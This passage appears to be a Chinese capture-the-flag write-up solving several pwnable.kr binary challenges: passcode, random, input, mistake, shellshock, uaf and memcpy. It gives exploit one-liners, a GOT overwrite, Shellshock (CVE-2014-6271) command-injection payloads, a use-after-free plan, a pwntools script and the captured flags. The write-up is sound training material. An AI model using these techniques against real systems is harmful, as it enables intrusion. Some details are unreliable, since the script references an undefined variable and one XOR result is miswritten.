system("/bin/cat flag"); &#125; else&#123; printf("Login Failed!\n"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf("enter you name : "); scanf("%100s", name); printf("Welcome %s!\n", name);&#125;int main()&#123; printf("Toddler's Secure Login System 1.0 beta.\n"); welcome(); login(); // something after login... printf("Now I can safely trust you that you have credential :)\n"); return 0;&#125; 看一眼开了什么保护，应该没什么大碍 有两个地方很扎眼 1234scanf("%d", passcode1);...scanf("%d", passcode2); 很明显passcode1，passcode2前面少了&amp; 这就意味着scanf会以为passcode里存放的值是passcode的地址，然后将stdin的数据存放在passcode指向的地址里。所以，如果我们能控制passcode里的值，那在输入passcode的时候就能实现任意位置写。 先从welcome()开始看 注意到这里是name[]的地址 得到了0xbfe72b28 再找passcode1的地址。注意这里有一个坑点，由于源代码中没有加&amp;,所以这里反汇编出来的代码就从lea变成mov了，所以直接用ebp-0x10就好，别去看edx。 最后得到passcode1地址为0xbfe72b88，同理得到passcode2的地址为0xbfe72b8c passcode1 - name = 0x60 = 96 passcode2 - name = 0x64 = 100 发现name的最后4个字节的数据可以覆盖到passcode1的值，而passcode2够不着不管他，有一个就够了。 所以可以利用plt和got表。只需要将passcode1的值覆盖为(某个函数)的plt地址，在输入passcode1时输入源码中system函数的地址，该地址将(某个函数)的got表项覆盖掉，所以在调用(某个函数)时就跳转到了system函数帮我们执行/bin/sh。 看一眼开了什么保护，relro为partial relro，所以got可写，成了。 选一个输入passcode1后的程序中用到的函数，比如fflush为0x804a004 然后system地址为0x080485e3,因为要给system传参(/bin/sh)，所以不能选下面那个地址(不然就没参数传进去了) 把system地址换成dec passcode@ubuntu:~$ python -c &apos;print &quot;A&quot;*96 + &quot;\x04\xa0\x04\x08&quot; + &quot;134514147&quot;&apos; | ./passcode Toddler&apos;s Secure Login System 1.0 beta. enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA! Sorry mom.. I got confused about scanf usage :( enter passcode1 : Now I can safely trust you that you have credential :) :) random题目: ssh random@pwnable.kr -p2222 (pw:guest) 123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; scanf("%d", &amp;key); if( (key ^ random) == 0xdeadbeef )&#123; printf("Good!\n"); system("/bin/cat flag"); return 0; &#125; printf("Wrong, maybe you should try 2^32 cases.\n"); return 0;&#125; 需要输入一个值，与一个随机值异或之后要等于0xdeadbeef。 开始一直在想溢出，想不出来，就只好进gdb一步一步看有没有可以入手的点。过了一遍，没发现可以下手的地方，再过一遍，发现random的值和上一次一样。。。接着又试了几遍，random的值依旧不变。 为0x6b8b4567 所以，直接0xdeadbeef ^ 0x6b8b4567 = 0x6b8b4567 = 3039230856 其原因是没有设置srandom的值，所以seed就默认为1，所以随机值一直不变。 :) input题目: ssh input2@pwnable.kr -p2222 (pw:guest) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123; printf("Welcome to pwnable.kr\n"); printf("Let's see if you know how to give input to program\n"); printf("Just give me correct inputs then you will get the flag :)\n"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],"\x00")) return 0; if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0; printf("Stage 1 clear!\n"); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0; read(2, buf, 4); if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0; printf("Stage 2 clear!\n"); // env if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0; printf("Stage 3 clear!\n"); // file FILE* fp = fopen("\x0a", "r"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0; fclose(fp); printf("Stage 4 clear!\n"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1)&#123; printf("socket error, tell admin\n"); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123; printf("bind error, use another port\n"); return 1; &#125; listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0)&#123; printf("accept error, tell admin\n"); return 0; &#125; if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0; printf("Stage 5 clear!\n"); // here's your flag system("/bin/cat flag"); return 0;&#125; 按要求输入，过五关拿flag。 看样子好像很复杂，其实都是linux C中进程间通信很基本的知识，查查资料，翻翻man page就可以理解。(虽然我还是看了wp :|) Stage1 - argv1、要100个参数 2、参数argv[‘A’] = “\x00” 3、参数argv[‘B’] = “\x20\x0a\x0d” 解题代码如下 1234char *arg[101] = &#123;"./input", [1 ... 99]="A", NULL&#125;;arg['A'] = "\x00";arg['B'] = "\x20\x0a\x0d";execve(arg[0], arg, NULL); arg[‘A’]表明取参数中的第65个参数，也就是A的ascii码。B同理。 arg[]，env[] (等下会提到)最后跟一个NULL原因如下 Stage2 - stdio1、从stdin中读取“\x00\x0a\x00\xff” 2、从stderr中读取“\x00\x0a\x02\xff” 需要用到pipe()，fork()，dup2()等 先贴出题解 123456789101112131415161718192021222324252627pid_t cpid;int fdstdin[2];int fdstderr[2];if(pipe(fdstdin) &lt; 0 || pipe(fdstderr) &lt; 0)&#123; perror("can't creat a pipe!"); exit(1);&#125;cpid = fork();if(cpid == 0)&#123; close(fdstdin[1]); close(fdstderr[1]); dup2(fdstdin[0], 0); dup2(fdstderr[0], 2); close(fdstdin[0]); close(fdstderr[0]); execve("/home/input2/input", arg, env);&#125;else&#123; close(fdstdin[0]); close(fdstderr[0]); write(fdstdin[1], "\x00\x0a\x00\xff", 4); write(fdstderr[1], "\x00\x0a\x02\xff", 4); close(fdstdin[1]); close(fdstderr[1]);&#125; 大致流程如下 父进程创建pipe ↑ 然后fork一个子进程，由于fork出的子进程与父进程几乎完全相同，所以子进程也连上了同一个pipe。 ↑ 简单地说，pipe相当于作为两个进程通信的通道，pipe返回两个参数，fdstdin[0]指向pipe的read端，fdstdin[1]指向pipe的write端。fdstdin[1]从write端写入的数据会被fdstdin[0]从read端读取到。(fdstderr同理) 用close(fdstdin[0])和close(fdstdin[1])分别把父进程的读取端和子进程的输入端关掉，达到父进程写，子进程读的目的，如上图。(fdstderr同理) 然后把子进程的stdin和stderr分别映射到其fdstdin和fdstderr，再用execve调用input，就可以通过控制父进程利用pipe向子进程写数据达到题目要求。 Stage3 - env1、环境变量中“\xda\xad\xbe\xef”的值要为“\xca\xfe\xba\xbe” 一开始想的是用setenv去设置环境变量的，貌似不好操作，发现可以直接通过刚才的execve传入环境变量。 12char *env[2] = &#123;"\xde\xad\xbe\xef=\xca\xfe\xba\xbe", NULL&#125;;execve("/home/input2/input", arg, env); Stage4 - file1、从文件名为“\x0a”的文件中读取到的前四个字节要为“\x00\x00\x00\x00” 直接创建文件即可 1234FILE *fp;fp = fopen("\x0a", "w+");fwrite("\x00\x00\x00\x00", 4, 1, fp);fclose(fp); Stage5 - network1、该题目作为服务器端，需要接收客户端发来的数据，并且数据的前四个字节为“\xde\xad\xbe\xef” 2、服务器端口为第67个参数(arg[‘C’]); 最后一个Stage，考察的是linux C的网络编程基础。 123456789101112arg['C'] = "4444";sleep(2);struct sockaddr_in server;int s = socket(AF_INET, SOCK_STREAM, 0);server.sin_family = AF_INET;inet_pton(AF_INET, "127.0.0.1", &amp;server.sin_addr);server.sin_port = htons(4444);connect(s, (struct sockaddr *)&amp;server, sizeof(server));write(s, "\xde\xad\xbe\xef", 4);close(s); 不加sleep(2)可能会出不了flag，网上的解释是client需要等待server进入accept状态。 Final把所有的综合起来 注意在运行之前要将该程序放在 /tmp/(自己再建一个文件夹)/ 这里运行，首先因为guest用户在/home/input2目录下没有创建文件的权限，而且直接在/tmp/下创建文件也拿不到flag。 创建好文件后还需要在当前目录执行命令 1ln -s /home/input2/flag flag 来将flag软连接到真实的flag，否则程序无法找到flag。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;sys/socket.h&gt;#include&lt;arpa/inet.h&gt;#include&lt;unistd.h&gt;int main(int argc, char* argv[], char* envp[])&#123; char *arg[101] = &#123;"./input", [1 ... 99]="A", NULL&#125;; arg['A'] = "\x00"; arg['B'] = "\x20\x0a\x0d"; arg['C'] = "4444"; char *env[2] = &#123;"\xde\xad\xbe\xef=\xca\xfe\xba\xbe", NULL&#125;; FILE *fp; fp = fopen("\x0a", "w+"); fwrite("\x00\x00\x00\x00", 4, 1, fp); fclose(fp); pid_t cpid; int fdstdin[2]; int fdstderr[2]; if(pipe(fdstdin) &lt; 0 || pipe(fdstderr) &lt; 0)&#123; perror("can't creat a pipe!"); exit(1); &#125; cpid = fork(); if(cpid == 0)&#123; close(fdstdin[1]); close(fdstderr[1]); dup2(fdstdin[0], 0); dup2(fdstderr[0], 2); close(fdstdin[0]); close(fdstderr[0]); execve("/home/input2/input", arg, env); &#125;else&#123; close(fdstdin[0]); close(fdstderr[0]); write(fdstdin[1], "\x00\x0a\x00\xff", 4); write(fdstderr[1], "\x00\x0a\x02\xff", 4); close(fdstdin[1]); close(fdstderr[1]); &#125; sleep(2); struct sockaddr_in server; int s = socket(AF_INET, SOCK_STREAM, 0); server.sin_family = AF_INET; inet_pton(AF_INET, "127.0.0.1", &amp;server.sin_addr); server.sin_port = htons(4444); connect(s, (struct sockaddr *)&amp;server, sizeof(server)); write(s, "\xde\xad\xbe\xef", 4); close(s);&#125; 最后拿到flag 12345678910input2@ubuntu:/tmp/666$ ./demaciaWelcome to pwnable.krLet&apos;s see if you know how to give input to programJust give me correct inputs then you will get the flag :)Stage 1 clear!Stage 2 clear!Stage 3 clear!Stage 4 clear!Stage 5 clear!input2@ubuntu:/tmp/666$ Mommy! I learned how to pass various input in Linux :) 参考：http://staff.ustc.edu.cn/~guoyan/os12/LinuxC.pdf mistake题目：ssh mistake@pwnable.kr -p2222 (pw:guest) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123; int i; for(i=0; i&lt;len; i++)&#123; s[i] ^= XORKEY; &#125;&#125;int main(int argc, char* argv[])&#123; int fd; if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0; &#125; printf("do not bruteforce...\n"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf("read error\n"); close(fd); return 0; &#125; char pw_buf2[PW_LEN+1]; printf("input password : "); scanf("%10s", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123; printf("Password OK\n"); system("/bin/cat flag\n"); &#125; else&#123; printf("Wrong Password\n"); &#125; close(fd); return 0;&#125; 看着代码长，其实就一个比较优先级的问题。 问题在第17行的if判断，原意是将open返回值赋给fd再和0比较，但由于‘&lt;’的优先级大于‘=’，所以实际上是先比较，再赋值。 若成功打开文件，fd为0，第27行的read就是从stdin读取数据存放到pw_buf。然后第38行将pw_buf2按位和1进行异或，实际上就是按位取反。最后pw_buf和pw_buf2比较，若相等，则拿到flag。 所以，让pw_buf=0000000000,pw_buf2=1111111111 123456mistake@ubuntu:~$ ./mistakedo not bruteforce...1111111111input password : 0000000000Password OKMommy, the operator priority always confuses me :( 拿到flag shellshock题目：ssh shellshock@pwnable.kr -p2222 (pw:guest) 1234567#include &lt;stdio.h&gt;int main()&#123; setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system("/home/shellshock/bash -c 'echo shock_me'"); return 0;&#125; 这道题来源于漏洞CVE-2014-6271(破壳漏洞) 所以首先学习一下这个漏洞。 CVE-2014-6271关于bash的环境变量。 首先看看普通环境变量是怎么定义的： 123456789shellshock@ubuntu:~$ test=&quot;abcd&quot; #这样定义的环境变量只能用于当前shellshellshock@ubuntu:~$ export test2=&quot;abcd&quot; #使用export定义的环境变量可以在当前shell及其子shell中使用shellshock@ubuntu:~$ bash #进入子shellshellshock@ubuntu:~$ echo $test2 #打印刚才设置环境变量abcd #可以输出shellshock@ubuntu:~$ echo $test #未加export的环境变量 #没有输出shellshock@ubuntu:~$ 然后看下bash的函数如何定义。 bash的函数定义方法和c很像： 1234shellshock@ubuntu:~$ x()&#123; echo &quot;test&quot;;&#125;shellshock@ubuntu:~$ xtestshellshock@ubuntu:~$ 所以同样也可以将函数定义为环境变量。 将函数定义为环境变量：(和普通环境变量一样，也是使用键值对的方式定义，等号左边是键，单引号内是值) 123shellshock@ubuntu:~$ export x=&apos;() &#123; echo a test;&#125;;&apos; #若不加export，此环境变量就不会在子shell生效shellshock@ubuntu:~$ env #这时用env查看环境变量就可以看到刚刚设置的环境变量变成了键值对形式x=() &#123; echo a test;&#125;; 也就是说，当环境变量的Value开头为’(){‘时，bash就认为这是一个函数，调用这个环境变量就相当于执行这个函数体的代码。 而CVE-2014-6271的漏洞就在于可以在函数体后面继续添加代码，并被执行。如下： 12345shellshock@ubuntu:~$ export x=&apos;() &#123; echo abc;&#125;;echo vuln!!;&apos; #在函数体后添加代码shellshock@ubuntu:~$ ./bash -c &quot;echo a test&quot; #调用有漏洞的shellvuln!!a testshellshock@ubuntu:~$ 可以看出，这个漏洞就是在调用shell并读取环境变量时，在读取到设置的函数时由于对函数边界的判断不严谨导致自动执行后面的语句。 参考： https://bbs.ichunqiu.com/thread-8046-1-1.html https://blog.csdn.net/tinyletero/article/details/40261593 文件的特殊权限知道了这些可以尝试一下解题了 很自然的构造出一个环境变量： 12345shellshock@ubuntu:~$ export x=&apos;() &#123; bash -c &quot;cat flag&quot;;&#125;;x;&apos;shellshock@ubuntu:~$ ./bash -c &quot;echo test&quot;cat: flag: Permission deniedSegmentation faultshellshock@ubuntu:~$ 整个payload如下 结果没权限读取flag文件 那就看一眼我们都有那些权限 注意到可执行文件./shellshock的gid具有s特权，也就是sgid权限。意味着执行者在执行过程中会获得该程序的用户组权限。所以当我以shellshock身份执行这个文件时，在执行过程中相当于我加入了shellshock_pwn用户组，所以shellshock调用的bash就具有了shellshock_pwn权限，而读取flag需要的权限就是shellshock_pwn，从而读到flag。 参考：http://www.cnblogs.com/snake-hand/p/3161511.html 所以把刚才的 1./bash -c &quot;echo test&quot; 换成 1./shellshock 就行了 最后拿到flag 123shellshock@ubuntu:~$ ./shellshockonly if I knew CVE-2014-6271 ten years ago..!!Segmentation fault 还有一种设置环境变量的方法也可以拿到flag，本质都差不多。 1env x=&apos;() &#123; bash -c &quot;cat flag&quot;;&#125;;x;&apos; ./shellshock env的作用：run a program in a modified environment 区别在于第二个解法的环境变量是一次性的。 uaf题目：ssh uaf@pwnable.kr -p2222 (pw:guest) 之前做protostar有一关uaf的题目逃课了，现在终于跑不了了(￣ε(#￣)☆ 什么是uafUse After Free，顾名思义：使用释放后的内存空间 我们知道，当访问一块已经被free过的内存时会让程序崩溃，像什么segmentation fault等等。uaf就是利用这一点，当我们重新申请一块和刚才一样大小的内存时，系统会把刚才那块内存分配给我们，但是由于系统并没有将指向之前被free的内存的指针置null，而新分配给我们的内存里的数据又是我们完全可控的，再利用刚才未被置null的指针，就可以劫持函数流，执行我们想执行的函数了。 所以，一块能触发uaf的内存至少应该满足： 大小可控 数据可控 虚函数和虚表在面向对象程序设计中，派生类继承自基类。若基类函数前有关键字virtual，则该函数为虚函数，在其派生类中若有同名函数，则在调用派生类对象的该函数时，调用派生类函数，不会调用基类的同名函数。反之，当对象是基类对象时，就调用基类函数。(c++多态的实现) 具体的实现方法就要用到虚表了。 每一个存在虚函数的类中都有一个虚表(vtable)，虚表中依次存放了指向各个虚函数的指针。类的对象有一个指向虚表表头的指针(vptr)，该指针处于对象内存布局的最开始，往后才是对象的各个数据成员。 在派生类中出现同名虚函数时，其虚表中指向同名函数的指针就会转而指向派生类的虚函数而非基类的，就像刚才说的一样。 派生类的虚表中除自己的虚函数指针外也包含其基类的虚函数指针(同名虚函数除外)，包括基类中的私有虚成员函数。 解题12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;fcntl.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private: virtual void give_shell()&#123; system("/bin/sh"); &#125;protected: int age; string name;public: virtual void introduce()&#123; cout &lt;&lt; "My name is " &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; "I am " &lt;&lt; age &lt;&lt; " years old" &lt;&lt; endl; &#125;&#125;;class Man: public Human&#123;public: Man(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; "I am a nice guy!" &lt;&lt; endl; &#125;&#125;;class Woman: public Human&#123;public: Woman(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; "I am a cute girl!" &lt;&lt; endl; &#125;&#125;;int main(int argc, char* argv[])&#123; Human* m = new Man("Jack", 25); Human* w = new Woman("Jill", 21); size_t len; char* data; unsigned int op; while(1)&#123; cout &lt;&lt; "1. use\n2. after\n3. free\n"; cin &gt;&gt; op; switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; "your data is allocated" &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; &#125; &#125; return 0;&#125; 分析： 1、一共有三个类，Human，Man和Woman，并且Man，Woman继承自Human。 2、Human中有两个虚函数，give_shell(私有)和introduce(公有)。并且其派生类重写了introduce函数。 3、主函数分别实例化Man和Woman类为对象。case1调用两个派生类的introduce函数；case2申请一段大小为argv[1]内存，并从名为argv[2]的文件内取长度为argv[1]的数据填充；case3释放开头实例化的对象的空间。 思路：利用uaf劫持函数流使进程执行give_shell函数 找到Man类的对象的大小，并将其作为argv[1]。 找到give_shell的地址 找到Man类的vtable和vptr，并覆写其vtable中指向introduce的指针为指向give_shell的指针。 要看一个对象的大小，就看其类中的数据成员。因为是64位的程序，所以Man类中的int，string各占8字节，因为有虚函数，所以再加上vptr的大小，也是8字节，一共24字节。所以argv[1]=24. 在new一个对象之前传的参数为0x18 = 24，所以刚才的推断没错。 搜一下vtable，找到了Man的vtable，第一个指针p1(0x401570)指向了give_shell，第二个p2(0x401578)指向了introduce。 从图中可以推断出v12和v13分别是m和w的vptr。在case1中调用introduce时，本来指针指向的是give_shell，将vptr的值+8，就变成指向introduce了。 当我们执行case3申请一个24字节大小的空间时，系统就会将刚才free掉的空间分配给我们。又因为指向m和w的指针依旧存在，所以只要我们构造新申请的内存内的数据为p1-8，再执行case1时，程序就会以为我们构造的地址指向give_shell，加上8，就指向了introduce，但其实+8之后是指向give_shell。最终执行give_shell，达到目的。 所以，p1 - 8 = 0x401570 - 8 = 0x401568 由于case3先后释放了m和w的内存，如果只执行一次case2只会得到w的那块内存，所以要执行两次case2。 memcpy题目：ssh memcpy@pwnable.kr -p2222 (pw:guest) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121// compiled with : gcc -o memcpy memcpy.c -m32 -lm#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;math.h&gt;unsigned long long rdtsc()&#123; asm("rdtsc");&#125;char* slow_memcpy(char* dest, const char* src, size_t len)&#123; int i; for (i=0; i&lt;len; i++) &#123; dest[i] = src[i]; &#125; return dest;&#125;char* fast_memcpy(char* dest, const char* src, size_t len)&#123; size_t i; // 64-byte block fast copy if(len &gt;= 64)&#123; i = len / 64; len &amp;= (64-1); while(i-- &gt; 0)&#123; __asm__ __volatile__ ( "movdqa (%0), %%xmm0\n" "movdqa 16(%0), %%xmm1\n" "movdqa 32(%0), %%xmm2\n" "movdqa 48(%0), %%xmm3\n" "movntps %%xmm0, (%1)\n" "movntps %%xmm1, 16(%1)\n" "movntps %%xmm2, 32(%1)\n" "movntps %%xmm3, 48(%1)\n" ::"r"(src),"r"(dest):"memory"); dest += 64; src += 64; &#125; &#125; // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;&#125;int main(void)&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf("Hey, I have a boring assignment for CS class.. :(\n"); printf("The assignment is simple.\n"); printf("-----------------------------------------------------\n"); printf("- What is the best implementation of memcpy? -\n"); printf("- 1. implement your own slow/fast version of memcpy -\n"); printf("- 2. compare them with various size of data -\n"); printf("- 3. conclude your experiment and submit report -\n"); printf("-----------------------------------------------------\n"); printf("This time, just help me out with my experiment and get flag\n"); printf("No fancy hacking, I promise :D\n"); unsigned long long t1, t2; int e; char* src; char* dest; unsigned int low, high; unsigned int size; // allocate memory char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); size_t sizes[10]; int i=0; // setup experiment parameters for(e=4; e&lt;14; e++)&#123; // 2^13 = 8K low = pow(2,e-1); high = pow(2,e); printf("specify the memcpy amount between %d ~ %d : ", low, high); scanf("%d", &amp;size); if( size &lt; low || size &gt; high )&#123; printf("don't mess with the experiment.\n"); exit(0); &#125; sizes[i++] = size; &#125; sleep(1); printf("ok, lets run the experiment with your configuration\n"); sleep(1); // run experiment for(i=0; i&lt;10; i++)&#123; size = sizes[i]; printf("experiment %d : memcpy with buffer size %d\n", i+1, size); dest = malloc( size ); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); slow_memcpy(dest, src, size); // byte-to-byte memcpy t2 = rdtsc(); printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); fast_memcpy(dest, src, size); // block-to-block memcpy t2 = rdtsc(); printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1); printf("\n"); &#125; printf("thanks for helping my experiment!\n"); printf("flag : ----- erased in this source code -----\n"); return 0;&#125; 读完源码，题目大意是这样的。用户输入满足题目要求的10个数，然后用malloc依次申请用户输入数字大小(size)的内存，每次申请后分别用自定义函数slow_memcpy和fast_memcpy将另一个内存的数据拷贝到刚才申请的内存中去，大小为size。用rdtsc计时。 从整个流程来看，只要按要求输入了10个数字，最后总能拿到flag，那就先在题目规定范围内随便输一些数。 遇到了段错误(SIGSEGV) 注意到是在movntps处停止的，没遇到过这个命令，查一下有什么用。 Moves the double quadword in the source operand (second operand) to the destination operand (first operand) using a non-temporal hint to minimize cache pollution during the write to memory. The source operand is an XMM register, which is assumed to contain four packed single-precision floating-point values. The destination operand is a 128-bit memory location. 感觉不是很能看懂，但是大意应该就是将xmm寄存器内的单精度浮点数据移动到m128寄存器。 You should not access the __m128 fields directly. You can, however, see these types in the debugger. A variable of type __m128 maps to the XMM[0-7] registers. Variables of type __m128 are automatically aligned on 16-byte boundaries. 于是查了一下什么是m128：https://docs.microsoft.com/en-us/cpp/cpp/m128?view=vs-2017 总结：类型为__m128的数据(大小为128字节)，分别对应映射到8个xmm寄存器XMM[0-7]，于是每个xmm寄存器大小为16字节(128bit),如下图。数据类型为__m128的变量需要16字节对齐。 所以什么是对齐？ 简单的说，同时对一组数据进行相同操作的技术称为SIMD(Single Instruction Multiple Data)，而执行SIMD指令要求数据的内存地址要和某个字节对齐(比如16字节对齐),这实际上意味着数据所在内存的地址需要被指令所需的字节数整除。 所以16字节对齐意思就是数据的内存地址要是16的整数倍，比如0x1230是16字节对齐，而0x1231没对齐。 1234567891011120x400863 &lt;fast_memcpy+37&gt;: mov eax,DWORD PTR [ebp+0xc] ;src地址()0x400866 &lt;fast_memcpy+40&gt;: mov edx,DWORD PTR [ebp+0x8] ;dest地址(需手动对齐)0x400869 &lt;fast_memcpy+43&gt;: movdqa xmm0,XMMWORD PTR [eax] ;0x40086d &lt;fast_memcpy+47&gt;: movdqa xmm1,XMMWORD PTR [eax+0x10] ;0x400872 &lt;fast_memcpy+52&gt;: movdqa xmm2,XMMWORD PTR [eax+0x20] ;0x400877 &lt;fast_memcpy+57&gt;: movdqa xmm3,XMMWORD PTR [eax+0x30] ;一次16字节，共4次，总共64字节大小数据从src存入xmm寄存器0x40087c &lt;fast_memcpy+62&gt;: movntps XMMWORD PTR [edx],xmm0 ;0x40087f &lt;fast_memcpy+65&gt;: movntps XMMWORD PTR [edx+0x10],xmm1 ;0x400883 &lt;fast_memcpy+69&gt;: movntps XMMWORD PTR [edx+0x20],xmm2 ;0x400887 &lt;fast_memcpy+73&gt;: movntps XMMWORD PTR [edx+0x30],xmm3 ;再将xmm寄存器内的数据存入dest0x40088b &lt;fast_memcpy+77&gt;: add DWORD PTR [ebp+0x8],0x40 ;0x40088f &lt;fast_memcpy+81&gt;: add DWORD PTR [ebp+0xc],0x40 ;src和dest分别递增64字节 由于我们一开始的数据是随便输入的，所以导致程序运行过程中有没对齐的情况，触发了sigsecv。从上上图看到edx(0x404468)是dest地址，未对齐，所以程序中断。 现在题目就变成了构造输入的数字，使其地址16字节对齐。 dest的内存是由malloc分配的。设我们申请的内存空间为x字节，加上chunk头部8字节的控制信息，我们申请的空间大小为8+x字节，但是由于malloc分配的内存是8字节对齐的，所以我们申请的内存大小有可能不是8+x。但是我们只要控制我们申请的内存是16字节对齐的，那malloc的8字节对齐就不会对我们申请内存的大小造成影响，再控制取值范围在2的n次幂内，就可以找到答案。 1234567n = 10x = 0while(n): if int(x + 8) % 16 == 0 and x &gt;= pow(2, 10-n+3): print(x) n = n-1 x = x+1 得到的结果为8,24,40,72,136,264,520,1032,2056,4104。 ssh连接服务器后nc 0 9022，在/tmp/目录下创建解题脚本： 123456789101112131415161718192021222324from pwn import *import timedef amt(): n = 10 x = 0 l = [] while(n): if int(x + 8) % 16 == 0 and x &gt;= pow(2, 10-n+3): l.append(a) n = n-1 x = x+1 return lr = remote('127.0.0.1',9022)print (r.recv())ll = amt()for i in range(10): r.sendline(str(ll[i])) print (r.recv())time.sleep(4)print(r.recv()) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869memcpy@ubuntu:/tmp$ python demacia.py[+] Opening connection to 127.0.0.1 on port 9022: DoneHey, I have a boring assignment for CS class.. :(The assignment is simple.------------------------------------------------------ What is the best implementation of memcpy? -- 1. implement your own slow/fast version of memcpy -- 2. compare them with various size of data -- 3. conclude your experiment and submit report ------------------------------------------------------This time, just help me out with my experiment and get flagNo fancy hacking, I promise :Dspecify the memcpy amount between 8 ~ 16 :specify the memcpy amount between 16 ~ 32 :specify the memcpy amount between 32 ~ 64 :specify the memcpy amount between 64 ~ 128 :specify the memcpy amount between 128 ~ 256 :specify the memcpy amount between 256 ~ 512 :specify the memcpy amount between 512 ~ 1024 :specify the memcpy amount between 1024 ~ 2048 :specify the memcpy amount between 2048 ~ 4096 :specify the memcpy amount between 4096 ~ 8192 :ok, lets run the experiment with your configurationexperiment 1 : memcpy with buffer size 8ellapsed CPU cycles for slow_memcpy : 1596ellapsed CPU cycles for fast_memcpy : 378experiment 2 : memcpy with buffer size 24ellapsed CPU cycles for slow_memcpy : 429ellapsed CPU cycles for fast_memcpy : 429experiment 3 : memcpy with buffer size 40ellapsed CPU cycles for slow_memcpy : 606ellapsed CPU cycles for fast_memcpy : 657experiment 4 : memcpy with buffer size 72ellapsed CPU cycles for slow_memcpy : 1020ellapsed CPU cycles for fast_memcpy : 273experiment 5 : memcpy with buffer size 136ellapsed CPU cycles for slow_memcpy : 2028ellapsed CPU cycles for fast_memcpy : 297experiment 6 : memcpy with buffer size 264ellapsed CPU cycles for slow_memcpy : 3618ellapsed CPU cycles for fast_memcpy : 288experiment 7 : memcpy with buffer size 520ellapsed CPU cycles for slow_memcpy : 7038ellapsed CPU cycles for fast_memcpy : 336experiment 8 : memcpy with buffer size 1032ellapsed CPU cycles for slow_memcpy : 13887ellapsed CPU cycles for fast_memcpy : 483experiment 9 : memcpy with buffer size 2056ellapsed CPU cycles for slow_memcpy : 27555ellapsed CPU cycles for fast_memcpy : 798experiment 10 : memcpy with buffer size 4104ellapsed CPU cycles for slow_memcpy : 56943ellapsed CPU cycles for fast_memcpy : 1650thanks for helping my experiment!flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt[*] Closed connection to 127.0.0.1 port 9022memcpy@ubuntu:/tmp$ 拿到flag 参考资料： 64-ia-32-architectures-optimization-manual SIMD what-does-alignment-to-16-byte-boundary-mean-in-x86 asm题目：ssh -p2222 asm@pwnable.kr (pw:guest) 